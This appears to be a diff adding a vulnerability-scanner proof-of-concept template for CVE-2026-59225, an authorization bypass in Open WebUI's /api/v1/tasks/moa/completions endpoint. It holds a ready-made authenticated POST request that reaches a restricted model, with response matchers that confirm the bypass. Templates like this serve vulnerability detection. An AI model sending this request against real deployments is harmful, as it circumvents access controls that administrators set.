@@ -1,0 +1,53 @@
+[info]
+author = "AVE"
+description = "验证 Open WebUI 任务端点 /api/v1/tasks/moa/completions 是否存在授权绕过：已认证非管理员用户可通过该端点直接访问受限底层模型，绕过 arena 包装模型的访问控制检查"
+id = "POC-AVE-2026-0824"
+name = "CVE-2026-59225 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-59225",
+    "open-webui",
+    "authorization-bypass",
+]
+vuln_id = [
+    "CVE-2026-59225",
+    "AVE-2026-0824",
+    "GHSA-m3qf-58wf-w979",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/tasks/moa/completions"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"model":"restricted-model-name","messages":[{"role":"user","content":"hello"}],"stream":false}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "choices",
+    "content",
+    "model",
+]
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "unauthorized",
+    "forbidden",
+    "access denied",
+    "not allowed",
+]
